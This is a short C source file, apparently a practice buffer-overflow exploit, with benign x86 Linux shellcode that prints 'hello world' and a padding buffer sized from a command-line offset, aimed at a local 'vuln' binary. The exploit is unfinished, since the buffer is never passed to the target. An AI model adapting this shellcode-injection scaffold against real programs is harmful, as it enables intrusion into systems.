#include<stdio.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>

#define NOP 0x90


unsigned char shellcode[] =

"\x31\xc0\xb0\x04\x31\xdb\x53\x68\x72\x6c\x64\x0a"
"\x68\x6f\x20\x77\x6f\x68\x68\x65\x6c\x6c\x89\xe1"
"\x31\xd2\xb3\x01\xb2\x0c\xcd\x80\xb0\x01\xcd\x80";

unsigned char Str[1000];




void main(int argc, char * argv[])

{

int nops;
	
	if(argc < 2)
	{
		printf("use:%s <offset>\n", argv[0]);
		return;
	}
			
		memset(Str,0,sizeof(Str));
		nops = atoi(argv[1]);	
		memset(Str,'a',nops);
//		memcpy(Str + nops,"\x62\x62\x62\x62",4);
		printf("iniciando...\n");
		execl("/home/neo/exploits/vuln","vuln","");
		printf("fim!!\n");
}



